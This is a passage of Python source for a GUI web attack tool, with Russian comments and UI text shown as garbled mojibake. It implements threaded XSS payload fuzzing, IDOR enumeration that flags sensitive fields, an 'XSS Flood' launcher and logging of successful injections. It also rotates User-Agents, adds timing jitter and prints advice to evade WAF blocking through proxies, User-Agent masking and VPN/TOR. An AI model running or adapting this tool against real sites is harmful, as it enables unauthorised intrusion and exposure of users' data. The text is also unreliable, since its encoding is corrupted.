        # ===== 7. –ì–ª–æ–±–∞–ª—å–Ω—ã–π TokenBucket –∏ —Å–µ–º–∞—Ñ–æ—Ä =====
        bucket = getattr(self, "_bucket", None) or TokenBucket(self.safety.max_rps)
        sem = getattr(self, "_sem", threading.Semaphore(self.safety.max_concurrency))

        # ===== 8. –î–µ—Ç–µ–∫—Ü–∏—è –æ—Ç—Ä–∞–∂–µ–Ω–∏—è =====
        def is_reflected(resp_text: str, raw_payload: str) -> bool:
            if raw_payload in resp_text:
                return True
            decoded = html.unescape(resp_text)
            if raw_payload in decoded:
                return True
            low = resp_text.lower()
            if ("<script" in low and "alert(1)" in low) or ("onerror" in low and "alert(1)" in low):
                return True
            return False

        # ===== 9. –û—Å–Ω–æ–≤–Ω–æ–π –∑–∞–ø—É—Å–∫: –ø–∞—Ä–∞–ª–ª–µ–ª—å–Ω—ã–π –ø–µ—Ä–µ–±–æ—Ä =====
        results: list[dict] = []
        req_idx = 0
        req_idx_lock = threading.Lock()
        threads: list[threading.Thread] = []

        def worker(target_base: str, payload: str) -> None:
            nonlocal req_idx

            encoded = urllib.parse.quote(payload, safe="")
            url = f"{target_base}{encoded}"
            if not is_allowed(url):
                self.log(f"[‚ö†Ô∏è] –ü—Ä–æ–ø—É—Å–∫: —Ü–µ–ª—å –≤–Ω–µ allowlist ‚Üí {url}")
                return

            with sem:
                try:
                    bucket.wait()
                except Exception:
                    pass

                if rate_limit > 0:
                    jitter = 0.7 + 0.6 * random.random()
                    time.sleep((1.0 / max(rate_limit, 0.0001)) * jitter)

                with req_idx_lock:
                    req_idx += 1
                    local_idx = req_idx

                headers = {
                    "User-Agent": random.choice(user_agents),
                    "Accept": accepts[local_idx % len(accepts)] if accepts else "*/*",
                }

                try:
                    token = self.token_combo.get().strip()
                    if token and token != "‚Äî":
                        headers["Authorization"] = f"Bearer {token}"
                except Exception:
                    pass

                try:
                    resp = session.get(url, headers=headers, timeout=timeout, allow_redirects=True)
                    reflected = is_reflected(resp.text, payload)

                    resp_file = os.path.join(out_dir, f"response_{local_idx:04d}.txt")
                    with open(resp_file, "w", encoding="utf-8") as f:
                        f.write(resp.text)

                    mark = "‚ö†Ô∏è" if reflected else "‚úÖ"
                    self.response_box.insert("end", f"{mark} {url} ‚Üí {resp.status_code}\n")

                    self.xss_tree.insert(
                        "",
                        "end",
                        values=(url, resp.status_code, "Yes" if reflected else "No", len(resp.text)),
                        tags=("reflected",) if reflected else ("clean",),
                    )

                    entry_ctx = {
                        "url": url,
                        "context": "üìú Reflected XSS" if reflected else "–ß–∏—Å—Ç–æ",
                        "category": "GET",
                        "param": "search",
                        "payload": payload,
                        "status": resp.status_code,
                        "length": len(resp.text),
                        "full_response": resp.text,
                    }
                    self.xss_results.append(entry_ctx)

                    if hasattr(self, "xss_context_tree"):
                        self.xss_context_tree.insert(
                            "",
                            "end",
                            values=(url, entry_ctx["context"], "GET", payload),
                            tags=("reflected",) if reflected else (),
                        )

                    results.append(
                        {
                            "url": url,
                            "status": resp.status_code,
                            "reflected": reflected,
                            "length": len(resp.text),
                            "response_path": os.path.relpath(resp_file, out_dir),
                        }
                    )

                except requests.exceptions.RetryError as retry_err:
                    self.response_box.insert("end", f"üîÅ {url} ‚Üí –ü–æ–≤—Ç–æ—Ä—ã –∏—Å—á–µ—Ä–ø–∞–Ω—ã: {retry_err}\n")
                    results.append({"url": url, "error": "RetryError", "message": str(retry_err)})
                except requests.exceptions.RequestException as e:
                    self.response_box.insert("end", f"‚ùå {url} ‚Üí {str(e)}\n")
                    results.append({"url": url, "error": "RequestException", "message": str(e)})
                except Exception as e:
                    self.response_box.insert("end", f"‚ùå {url} ‚Üí {str(e)}\n")
                    results.append({"url": url, "error": "Exception", "message": str(e)})

                if interval > 0:
                    time.sleep(interval)

        for base in base_targets:
            for p in payloads:
                t = threading.Thread(target=worker, args=(base, p), daemon=True)
                threads.append(t)
                t.start()

        for t in threads:
            t.join()

        # ===== 10. –§–∏–Ω–∞–ª—å–Ω–∞—è —Å–≤–æ–¥–∫–∞ –∏ –æ—Ç—á—ë—Ç (–∞—Ç–æ–º–∞—Ä–Ω–æ) =====
        success_count = sum(1 for r in results if "status" in r)
        fail_count = sum(1 for r in results if "error" in r)
        reflected_count = sum(1 for r in results if r.get("reflected"))

        self.response_box.insert("end", "\nüìä –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ XSS-–ø—Ä–æ–≤–µ—Ä–∫–∏:\n")
        self.response_box.insert("end", f"  ‚úÖ –£—Å–ø–µ—à–Ω—ã—Ö –∑–∞–ø—Ä–æ—Å–æ–≤: {success_count}\n")
        self.response_box.insert("end", f"  ‚ö†Ô∏è –û—Ç—Ä–∞–∂—ë–Ω–Ω—ã—Ö –ø–µ–π–ª–æ–∞–¥–æ–≤: {reflected_count}\n")
        self.response_box.insert("end", f"  ‚ùå –û—à–∏–±–æ–∫/—Ç–∞–π–º-–∞—É—Ç–æ–≤: {fail_count}\n")

        if fail_count == len(results) and len(results) > 0:
            self.response_box.insert("end", "\nüìâ –í—Å–µ –∑–∞–ø—Ä–æ—Å—ã –≤ –æ—à–∏–±–∫–µ/—Ç–∞–π–º-–∞—É—Ç–µ –∏–ª–∏ –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω—ã.\n")
            self.response_box.insert("end", "üí° –í–æ–∑–º–æ–∂–Ω—ã–µ –ø—Ä–∏—á–∏–Ω—ã:\n")
            self.response_box.insert("end", "  ‚Ä¢ –°–µ—Ä–≤–µ—Ä –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω –∏–ª–∏ –ø–µ—Ä–µ–≥—Ä—É–∂–µ–Ω\n")
            self.response_box.insert("end", "  ‚Ä¢ –ë–ª–æ–∫–∏—Ä–æ–≤–∫–∞ –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏—Ö –∑–∞–ø—Ä–æ—Å–æ–≤ (WAF)\n")
            self.response_box.insert("end", "  ‚Ä¢ –ü—Ä–æ–±–ª–µ–º—ã —Å —Å–µ—Ç—å—é –∏–ª–∏ DNS\n")
            self.response_box.insert("end", "\nüîß –†–µ–∫–æ–º–µ–Ω–¥–∞—Ü–∏–∏:\n")
            self.response_box.insert("end", "  ‚Ä¢ –ü—Ä–æ–≤–µ—Ä—å –¥–æ—Å—Ç—É–ø–Ω–æ—Å—Ç—å —Å–∞–π—Ç–∞ –≤—Ä—É—á–Ω—É—é\n")
            self.response_box.insert("end", "  ‚Ä¢ –£–≤–µ–ª–∏—á—å —Ç–∞–π–º–∞—É—Ç –¥–æ 10‚Äì15 —Å–µ–∫—É–Ω–¥\n")
            self.response_box.insert("end", "  ‚Ä¢ –ò—Å–ø–æ–ª—å–∑—É–π –ø—Ä–æ–∫—Å–∏ –∏–ª–∏ –º–∞—Å–∫–∏—Ä–æ–≤–∫—É User-Agent\n")
            self.response_box.insert("end", "  ‚Ä¢ –ü–æ–ø—Ä–æ–±—É–π –∑–∞–ø—É—Å–∫ —Å VPN/TOR\n")

        try:
            tmp = f"{summary_path}.tmp"
            with open(tmp, "w", encoding="utf-8") as f:
                json.dump(
                    {
                        "targets": base_targets,
                        "payload_count": len(payloads),
                        "request_count": req_idx,
                        "timeout": timeout,
                        "rate_limit": rate_limit,
                        "interval": interval,
                        "results": results,
                    },
                    f,
                    indent=2,
                    ensure_ascii=False,
                )
            os.replace(tmp, summary_path)
            messagebox.showinfo("XSS-—Ç–µ—Å—Ç –∑–∞–≤–µ—Ä—à—ë–Ω", f"–†–µ–∑—É–ª—å—Ç–∞—Ç—ã —Å–æ—Ö—Ä–∞–Ω–µ–Ω—ã –≤:\n{summary_path}")
        except Exception as e:
            messagebox.showerror("–û—à–∏–±–∫–∞", f"–ù–µ —É–¥–∞–ª–æ—Å—å —Å–æ—Ö—Ä–∞–Ω–∏—Ç—å –æ—Ç—á—ë—Ç:\n{e}")

    def run_idor_test(self):
        """–†–∞—Å—à–∏—Ä–µ–Ω–Ω–æ–µ IDOR‚Äë—Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ —Å –∞–Ω–∞–ª–∏–∑–æ–º —á—É–≤—Å—Ç–≤–∏—Ç–µ–ª—å–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö –∏ –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ–º."""
        token = self.token_combo.get().strip()
        headers = {"Content-Type": "application/json"}

        if token and token != "‚Äî":
            headers["Authorization"] = f"Bearer {token}"

        # –ù–∞–±–æ—Ä —Ç–µ—Å—Ç–æ–≤—ã—Ö –∑–Ω–∞—á–µ–Ω–∏–π
        test_ids = ["1", "2", "admin", "null", "0", "-1"]
        param_names = ["id", "user_id", "account", "profile"]

        # –ö–ª—é—á–∏, –∫–æ—Ç–æ—Ä—ã–µ —Å—á–∏—Ç–∞—é—Ç—Å—è —á—É–≤—Å—Ç–≤–∏—Ç–µ–ª—å–Ω—ã–º–∏
        sensitive_keys = {"email", "username", "role", "admin", "token", "jwt", "session", "id"}

        self.idor_results = []
        self.response_box.insert("end", "\nüß™ –†–∞—Å—à–∏—Ä–µ–Ω–Ω–æ–µ IDOR‚Äë—Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ:\n")

        if not self.api_list:
            self.response_box.insert("end", "‚ö†Ô∏è –ù–µ—Ç API‚Äë—ç–Ω–¥–ø–æ–∏–Ω—Ç–æ–≤ –¥–ª—è —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è.\n")
            return

        for endpoint in self.api_list:
            endpoint = endpoint.strip()
            if not endpoint:
                continue

            for param in param_names:
                for test_id in test_ids:

                    # –§–æ—Ä–º–∏—Ä—É–µ–º URL
                    url = f"{endpoint}&{param}={test_id}" if "?" in endpoint else f"{endpoint}?{param}={test_id}"

                    try:
                        response = requests.get(url, headers=headers, timeout=6)
                        text = response.text
                        preview = text[:300]

                        # –û–ø—Ä–µ–¥–µ–ª—è–µ–º —á—É–≤—Å—Ç–≤–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å
                        sensitive = False
                        try:
                            parsed = response.json()
                            if self.contains_sensitive(parsed, sensitive_keys):
                                sensitive = True
                        except Exception:
                            low = preview.lower()
                            if any(k in low for k in sensitive_keys):
                                sensitive = True

                        entry = {
                            "url": url,
                            "status": response.status_code,
                            "length": len(text),
                            "sensitive": sensitive,
                            "preview": preview
                        }

                        self.idor_results.append(entry)

                        mark = "‚ö†Ô∏è" if sensitive else "‚úÖ"
                        self.response_box.insert(
                            "end",
                            f"{mark} {url} ‚Üí {response.status_code} ({len(text)} bytes)\n"
                        )

                    except Exception as e:
                        self.response_box.insert("end", f"‚ùå {url} ‚Üí {str(e)}\n")
                        self.idor_results.append({
                            "url": url,
                            "status": 0,
                            "sensitive": False,
                            "error": str(e)
                        })

        # –û–±–Ω–æ–≤–ª—è–µ–º —Ç–∞–±–ª–∏—Ü—É
        self.display_idor_results()

        # –°–æ—Ö—Ä–∞–Ω—è–µ–º –ª–æ–≥
        os.makedirs("logs", exist_ok=True)
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        log_path = f"logs/idor_test_{timestamp}.json"

        with open(log_path, "w", encoding="utf-8") as f:
            json.dump(self.idor_results, f, indent=2, ensure_ascii=False)

        messagebox.showinfo("IDOR-—Ç–µ—Å—Ç –∑–∞–≤–µ—Ä—à—ë–Ω", f"–†–µ–∑—É–ª—å—Ç–∞—Ç—ã —Å–æ—Ö—Ä–∞–Ω–µ–Ω—ã –≤:\n{log_path}")

    # ============================
    #   IDOR DISPLAY / FILTERING
    # ============================

    def display_idor_results(self, status_filter="All"):
        """–û—Ç–æ–±—Ä–∞–∂–∞–µ—Ç —Ä–µ–∑—É–ª—å—Ç–∞—Ç—ã IDOR‚Äë—Ç–µ—Å—Ç–∞ –≤ —Ç–∞–±–ª–∏—Ü–µ."""
        for item in self.idor_tree.get_children():
            self.idor_tree.delete(item)

        for entry in self.idor_results:
            if status_filter != "All" and str(entry.get("status")) != status_filter:
                continue

            tag = "sensitive" if entry.get("sensitive") else "normal"

            self.idor_tree.insert(
                "",
                "end",
                values=(
                    entry.get("url"),
                    entry.get("status"),
                    "‚ö†Ô∏è Yes" if entry.get("sensitive") else "No"
                ),
                tags=(tag,)
            )

    def filter_idor_results(self, event=None):
        """–§–∏–ª—å—Ç—Ä–∞—Ü–∏—è –ø–æ —Å—Ç–∞—Ç—É—Å‚Äë–∫–æ–¥—É."""
        selected_status = self.status_filter.get()
        self.display_idor_results(status_filter=selected_status)

    # ============================
    #         EXPORT TO CSV
    # ============================

    def export_idor_to_csv(self):
        file_path = filedialog.asksaveasfilename(
            defaultextension=".csv",
            filetypes=[("CSV files", "*.csv")]
        )
        if not file_path:
            return

        with open(file_path, "w", newline="", encoding="utf-8") as f:
            writer = csv.writer(f)
            writer.writerow(["URL", "Status", "Sensitive"])

            for item in self.idor_tree.get_children():
                writer.writerow(self.idor_tree.item(item)["values"])

        messagebox.showinfo("‚úÖ –≠–∫—Å–ø–æ—Ä—Ç –∑–∞–≤–µ—Ä—à—ë–Ω", f"–†–µ–∑—É–ª—å—Ç–∞—Ç—ã —Å–æ—Ö—Ä–∞–Ω–µ–Ω—ã –≤:\n{file_path}")

    # ============================
    #     HTTP REQUEST HELPERS
    # ============================

    def send_request(self, url: str):
        """–ë–µ–∑–æ–ø–∞—Å–Ω—ã–π GET-–∑–∞–ø—Ä–æ—Å —Å –≤–æ–∑–≤—Ä–∞—Ç–æ–º DummyResponse –ø—Ä–∏ –æ—à–∏–±–∫–µ."""
        try:
            return requests.get(url, timeout=5)
        except Exception as e:
            class DummyResponse:
                status_code = 0
                text = str(e)

            return DummyResponse()

    def detect_sensitive_data(self, response):
        """–ü—Ä–æ—Å—Ç–∞—è —ç–≤—Ä–∏—Å—Ç–∏–∫–∞ –¥–ª—è –ø–æ–∏—Å–∫–∞ —á—É–≤—Å—Ç–≤–∏—Ç–µ–ª—å–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö."""
        keywords = ["password", "ssn", "credit", "token", "secret", "auth", "jwt"]
        text = response.text.lower()
        return any(kw in text for kw in keywords)

    # ============================
    #   JSON FILE SELECTION
    # ============================

    def select_json_file(self):
        """–û—Ç–∫—Ä—ã–≤–∞–µ—Ç –¥–∏–∞–ª–æ–≥ –≤—ã–±–æ—Ä–∞ JSON-—Ñ–∞–π–ª–∞ –∏ –∑–∞–≥—Ä—É–∂–∞–µ—Ç —Ä–µ–∑—É–ª—å—Ç–∞—Ç—ã."""
        path = filedialog.askopenfilename(
            title="–í—ã–±–µ—Ä–∏ JSON-—Ñ–∞–π–ª",
            filetypes=[("JSON files", "*.json")]
        )
        if path:
            self.load_scan_results(Path(path))

    # ============================
    #   LOAD SCAN RESULTS
    # ============================

    def load_scan_results(self, custom_path: Path | None = None):
        """–ó–∞–≥—Ä—É–∂–∞–µ—Ç API endpoints –∏ —Ç–æ–∫–µ–Ω—ã –∏–∑ JSON-—Ñ–∞–π–ª–æ–≤."""
        self.api_list.clear()
        self.token_list.clear()

        # –û–±–Ω–æ–≤–ª—è–µ–º —Å–ø–∏—Å–æ–∫ payload'–æ–≤
        try:
            self.payload_combo["values"] = list(generate_payloads().keys())
        except Exception:
            self.payload_combo["values"] = []

        # –ö–∞–Ω–¥–∏–¥–∞—Ç—ã –¥–ª—è –∑–∞–≥—Ä—É–∑–∫–∏
        candidates = [custom_path] if custom_path else [
            CRAWLER_RESULTS_PATH,
            DEEP_CRAWL_JSON_PATH,
        ]

        for path in candidates:
            if path and path.exists():
                try:
                    data = _safe_load_json(path, default={})
                    self.api_list.extend(data.get("api_endpoints", []))
                    self.token_list.extend(data.get("tokens", []))
                    self.log(f"[üì•] –ó–∞–≥—Ä—É–∂–µ–Ω—ã –¥–∞–Ω–Ω—ã–µ –∏–∑: {path}")
                    break
                except Exception as e:
                    self.log(f"[‚ùå] –û—à–∏–±–∫–∞ —á—Ç–µ–Ω–∏—è {path}: {e}")

        # –û–±–Ω–æ–≤–ª—è–µ–º UI
        self.api_combo["values"] = self.api_list or ["‚Äî"]
        self.token_combo["values"] = self.token_list or ["‚Äî"]

        if self.api_list:
            self.api_combo.set(self.api_list[0])
        if self.token_list:
            self.token_combo.set(self.token_list[0])

    # ============================
    #   SENSITIVE JSON DETECTOR
    # ============================

    def contains_sensitive(self, data, keys):
        """–†–µ–∫—É—Ä—Å–∏–≤–Ω–æ –ø—Ä–æ–≤–µ—Ä—è–µ—Ç JSON –Ω–∞ –Ω–∞–ª–∏—á–∏–µ —á—É–≤—Å—Ç–≤–∏—Ç–µ–ª—å–Ω—ã—Ö –∫–ª—é—á–µ–π."""
        if isinstance(data, dict):
            for k, v in data.items():
                if k.lower() in keys:
                    return True
                if self.contains_sensitive(v, keys):
                    return True

        elif isinstance(data, list):
            for item in data:
                if self.contains_sensitive(item, keys):
                    return True

        return False

    # ============================
    #         XSS FLOOD
    # ============================

    def launch_flood(self):
        """–ó–∞–ø—É—Å–∫–∞–µ—Ç XSS Flood —Å –∫–æ–Ω—Ç—Ä–æ–ª–µ–º —Å–æ–≥–ª–∞—Å–∏—è –∏ –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ–º."""
        if not self._require_consent():
            self.log("[‚ö†Ô∏è] –ê—Ç–∞–∫–∞ –æ—Ç–º–µ–Ω–µ–Ω–∞: –Ω–µ—Ç –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è.")
            return

        try:
            interval = float(self.interval_entry.get())
        except ValueError:
            self.log("[‚ö†Ô∏è] –ù–µ–≤–µ—Ä–Ω—ã–π –∏–Ω—Ç–µ—Ä–≤–∞–ª, –∏—Å–ø–æ–ª—å–∑—É—é 1 —Å–µ–∫.")
            interval = 1.0

        self.success_count = 0
        self.log("[üöÄ] –ó–∞–ø—É—â–µ–Ω XSS Flood...")

        def flood_callback(url, status_code, content):
            text = content.lower()
            if status_code == 200 and ("alert" in text or "confirm" in text):
                self.success_count += 1
                self.log(f"[‚úÖ] –£—Å–ø–µ—à–Ω–∞—è –∏–Ω—ä–µ–∫—Ü–∏—è #{self.success_count}: {url}")
            else:
                self.log(f"[üì°] –û—Ç–≤–µ—Ç {status_code} –æ—Ç {url}")

        threading.Thread(
            target=start_flood,
            kwargs={
                "flood_interval": interval,
                "flood_count": 50,
                "callback": flood_callback
            },
            daemon=True
        ).start()

    # ============================
    #     SAVE SUCCESSFUL ATTACK
    # ============================

    def save_success(self, url, payload):
        """–°–æ—Ö—Ä–∞–Ω—è–µ—Ç —É—Å–ø–µ—à–Ω—É—é XSS-–∏–Ω—ä–µ–∫—Ü–∏—é –≤ —Ñ–∞–π–ª."""
        entry = {
            "url": url,
            "payload": payload,
            "time": str(datetime.datetime.now())
        }
        try:
            with open("successful_attacks.json", "a", encoding="utf-8") as f:
                f.write(json.dumps(entry) + "\n")
        except Exception as e:
            self.log(f"[–û—à–∏–±–∫–∞ –∑–∞–ø–∏—Å–∏] {e}")

    # ===== –ó–∞–ø—É—Å–∫ XSS-–∞—Ç–∞–∫–∏ =====
    def start_xss_attack(self):
        raw = self.api_combo.get().strip()
        token = self.token_combo.get().strip() if self.token_combo.get() != "‚Äî" else None
        method = self.method_combo.get().strip().upper()
        category = self.category_combo.get()
        try:
            interval = int(self.interval_entry.get())
        except ValueError:
            interval = 3

        # ‚úÖ –ò–∑–≤–ª–µ–∫–∞–µ–º URL –∏–∑ —Å–ª–æ–≤–∞—Ä—è –∏ –Ω–æ—Ä–º–∞–ª–∏–∑—É–µ–º —Å—Ö–µ–º—É
        try:
            endpoint = self._parse_endpoint(raw)
            url = endpoint["url"]
        except ValueError as e:
            self.log(f"[‚ùå] {e}")
            return

        try:
            timeout = float(self.timeout_spin.get())
        except Exception:
            timeout = CONFIG["network"]["default_timeout"]

        # === 4. –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è —Å–µ—Å—Å–∏–∏ ===
        session = create_retry_session(
            total=CONFIG["network"]["retry_total"],
            backoff=CONFIG["network"]["retry_backoff"],
            proxies=CONFIG["network"]["proxies"],
            timeout=timeout
        )
        self.attacker = XSSAttacker(
            url=url,
            method=method,
            token=token,
            category=category,
            interval=interval,
            timeout=timeout,
            rps=CONFIG["network"]["max_rps"],
            proxies=CONFIG["network"]["proxies"],
            on_log=self.log
        )
        self.attacker.start()
        self.log("üöÄ XSS-–∞—Ç–∞–∫–∞ –∑–∞–ø—É—â–µ–Ω–∞")

    # ===== –û—Å—Ç–∞–Ω–æ–≤–∫–∞ XSS-–∞—Ç–∞–∫–∏ =====
    def stop_xss_attack(self):
        if self.attacker:
            self.attacker.stop()
            self.attacker = None
            self.log("üõë –ê—Ç–∞–∫–∞ –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∞")
        else:
            self.log("‚ö†Ô∏è –ù–µ—Ç –∞–∫—Ç–∏–≤–Ω–æ–π –∞—Ç–∞–∫–∏")

    # ===== –ó–∞–ø—É—Å–∫ XSS-—Ñ—É–∑–∑–∏–Ω–≥–∞ =====
    def run_xss_fuzzing(self):
        # –ü—Ä–∏–º–µ—á–∞–Ω–∏–µ: –ø–µ—Ä–µ–º–µ—Å—Ç–∏—Ç–µ –∏–º–ø–æ—Ä—Ç—ã –≤ –Ω–∞—á–∞–ª–æ —Ñ–∞–π–ª–∞ (ast —É–∂–µ –∏–º–ø–æ—Ä—Ç–∏—Ä–æ–≤–∞–Ω)
        raw = self.api_combo.get().strip()
        if not raw or raw == "‚Äî":
            messagebox.showerror("–û—à–∏–±–∫–∞", "–£–∫–∞–∂–∏ —Ü–µ–ª–µ–≤–æ–π URL –¥–ª—è XSS-—Ñ—É–∑–∑–∏–Ω–≥–∞.")
            return

        try:
            endpoint = self._parse_endpoint(raw)
            url = endpoint["url"]
        except ValueError as e:
            messagebox.showerror("–û—à–∏–±–∫–∞", str(e))
            return

        method = self.method_combo.get().strip().upper()
        if method not in ("GET", "POST", "PUT", "PATCH", "DELETE", "HEAD", "OPTIONS"):
            messagebox.showerror("–û—à–∏–±–∫–∞", f"–ù–µ–ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ–º—ã–π HTTP-–º–µ—Ç–æ–¥: {method}")
            return

        try:
            timeout = float(self.timeout_spin.get())
        except Exception:
            timeout = CONFIG["network"]["default_timeout"]

        try:
            rate_limit = float(self.rate_spin.get())
        except Exception:
            rate_limit = CONFIG["network"]["max_rps"]

        # –ó–∞–≥–æ–ª–æ–≤–∫–∏: Content-Type –∏–º–µ–µ—Ç —Å–º—ã—Å–ª —Ç–æ–ª—å–∫–æ –¥–ª—è —Ç–µ–ª–µ—Å–æ–¥–µ—Ä–∂–∞—â–∏—Ö –º–µ—Ç–æ–¥–æ–≤
        headers = {}
        if method in ("POST", "PUT", "PATCH"):
            headers["Content-Type"] = "application/json"

        token = self.token_combo.get().strip()
        if token and token != "‚Äî":
            headers["Authorization"] = f"Bearer {token}"

        # –î–∞–ª—å—à–µ: –ø–æ–¥–≥–æ—Ç–æ–≤–∫–∞ payloads/base_targets/session –∏ –∑–∞–ø—É—Å–∫ –ø–æ—Ç–æ–∫–æ–≤
        # (—ç—Ç–æ—Ç –∫–æ–¥ –æ—Å—Ç–∞–≤–ª–µ–Ω –∑–∞ –ø—Ä–µ–¥–µ–ª–∞–º–∏ —Ñ—Ä–∞–≥–º–µ–Ω—Ç–∞; —É–±–µ–¥–∏—Ç–µ—Å—å, —á—Ç–æ:
        #  - session, sem, bucket, req_idx, req_idx_lock, user_agents, accepts –∏ —Ç.–¥. –æ–ø—Ä–µ–¥–µ–ª–µ–Ω—ã,
        #  - payloads –∏ base_targets –∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ —Å—Ñ–æ—Ä–º–∏—Ä–æ–≤–∞–Ω—ã,
        #  - –≤—Å–µ –æ–ø–µ—Ä–∞—Ü–∏–∏ —Å req_idx –∑–∞—â–∏—â–µ–Ω—ã –æ–¥–Ω–∏–º –∏ —Ç–µ–º –∂–µ lock)

        # === 2. –ó–∞–≥—Ä—É–∑–∫–∞ –ø–µ–π–ª–æ–∞–¥–æ–≤ ===
        payloads = []
        payload_source = ""
        manual_text = self.payload_box.get("1.0", "end").strip()

        try:
            parsed = json.loads(manual_text)
            if isinstance(parsed, list):
                payloads = parsed
                payload_source = "—Ä—É—á–Ω–æ–π JSON (—Å–ø–∏—Å–æ–∫)"
            elif isinstance(parsed, dict):
                for key in ("payloads", "values"):
                    if isinstance(parsed.get(key), list):
                        payloads = parsed[key]
                        payload_source = f"—Ä—É—á–Ω–æ–π JSON ‚Üí {key}"
                        break
                if not payloads:
                    payloads = [parsed]
                    payload_source = "—Ä—É—á–Ω–æ–π JSON ‚Üí –æ–±—ä–µ–∫—Ç"
        except Exception as e:
            category = self.payload_combo.get()
            payloads = generate_payloads().get(category, [])
            payload_source = f"–∫–∞—Ç–µ–≥–æ—Ä–∏—è ¬´{category}¬ª"
            self.log(f"[‚ÑπÔ∏è] –ü–µ–π–ª–æ–∞–¥—ã –≤–∑—è—Ç—ã –∏–∑ –∫–∞—Ç–µ–≥–æ—Ä–∏–∏, JSON –Ω–µ —Ä–∞—Å–ø–æ–∑–Ω–∞–Ω: {e}")

        if not payloads:
            messagebox.showerror("–û—à–∏–±–∫–∞", "–ù–µ—Ç –¥–æ—Å—Ç—É–ø–Ω—ã—Ö –ø–µ–π–ª–æ–∞–¥–æ–≤.")
            return

        # === 3. –ü–æ–¥–≥–æ—Ç–æ–≤–∫–∞ –ª–æ–≥–æ–≤ ===
        os.makedirs("logs", exist_ok=True)
        ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        out_dir = os.path.join("logs", f"xss_fuzz_{ts}")
        os.makedirs(out_dir, exist_ok=True)
        summary_path = os.path.join(out_dir, "summary.json")

        self.log(f"[üîç] –ó–∞–ø—É—Å–∫ XSS-—Ñ—É–∑–∑–∏–Ω–≥–∞ –Ω–∞ {url} ({method}), {len(payloads)} –ø–µ–π–ª–æ–∞–¥–æ–≤ –∏–∑ {payload_source}...")

        # === 4. –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è —Å–µ—Å—Å–∏–∏ –∏ –∞—Ç–∞–∫–µ—Ä–∞ ===
        session = create_retry_session(
            total=CONFIG["network"]["retry_total"],
            backoff=CONFIG["network"]["retry_backoff"],
            proxies=CONFIG["network"]["proxies"],
            timeout=timeout
        )

        self.attacker = XSSAttacker(
            url=url,
            method=method,
            token=token,
            category="",
            interval=1,
            timeout=timeout,
            rps=rate_limit if rate_limit > 0 else self.safety.max_rps,
            proxies=CONFIG["network"]["proxies"],
            on_log=self.log
        )
        self.attacker.start_custom_payloads(payloads)

        # === 5. –°–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ –±–∞–∑–æ–≤–æ–≥–æ –æ—Ç—á—ë—Ç–∞ ===
        try:
            with open(summary_path, "w", encoding="utf-8") as f:
                json.dump({
                    "url": url,
                    "method": method,
                    "headers": headers,
                    "payload_source": payload_source,
                    "payload_count": len(payloads),
                    "timeout": timeout,
                    "rate_limit": rate_limit,
                    "results": []
                }, f, ensure_ascii=False, indent=2)
            self.log(f"[üìÅ] –û—Ç—á—ë—Ç —Å–æ–∑–¥–∞–Ω: {summary_path}")
        except Exception as e:
            self.log(f"[‚ö†Ô∏è] –ù–µ —É–¥–∞–ª–æ—Å—å —Å–æ—Ö—Ä–∞–Ω–∏—Ç—å summary.json: {e}")

        self.log(f"[‚úÖ] –§—É–∑–∑–∏–Ω–≥ –∑–∞–ø—É—â–µ–Ω, —Ä–µ–∑—É–ª—å—Ç–∞—Ç—ã –±—É–¥—É—Ç –ø–æ—è–≤–ª—è—Ç—å—Å—è –≤ –ª–æ–≥–∞—Ö.")

    # ===== –û—Å—Ç–∞–Ω–æ–≤–∫–∞ XSS-–∞—Ç–∞–∫–∏ (–¥—É–±–ª–∏–∫–∞—Ç - –∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ stop_xss_attack) =====
    def stop_xss_attacks(self):
        """DEPRECATED: –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ stop_xss_attack()"""
        return self.stop_xss_attack()

    # ===== –û—Ç–ø—Ä–∞–≤–∫–∞ API-–∑–∞–ø—Ä–æ—Å–∞ =====
    def send_api_request(self):
        raw = self.api_combo.get().strip()
        token = self.token_combo.get().strip()
        method = self.method_combo.get()
        payload = self.payload_box.get("1.0", "end").strip()

        if not raw or raw == "‚Äî":
            messagebox.showerror("–û—à–∏–±–∫–∞", "–£–∫–∞–∂–∏ API endpoint.")
            return

        # ‚úÖ –ë–µ–∑–æ–ø–∞—Å–Ω–æ–µ –∏–∑–≤–ª–µ—á–µ–Ω–∏–µ URL –∏–∑ —Å–ª–æ–≤–∞—Ä—è
        try:
            endpoint = self._parse_endpoint(raw)
            url = endpoint["url"]
        except ValueError as e:
            messagebox.showerror("–û—à–∏–±–∫–∞", str(e))
            return

        headers = {"Content-Type": "application/json"}
        if token:
            headers["Authorization"] = f"Bearer {token}"

        try:
            if method == "GET":
                response = requests.get(url, headers=headers, timeout=8)
            else:
                try:
                    json_data = json.loads(payload) if payload else {}
                except json.JSONDecodeError:
                    messagebox.showerror("–û—à–∏–±–∫–∞", "–ù–µ–≤–∞–ª–∏–¥–Ω—ã–π JSON payload.")
                    return
                response = requests.post(url, headers=headers, json=json_data, timeout=8)

            self.response_box.delete("1.0", "end")
            self.response_box.insert("end", f"üì° Status: {response.status_code}\n\n")

            try:
                parsed = response.json()
                self.response_box.insert("end", json.dumps(parsed, indent=2, ensure_ascii=False))
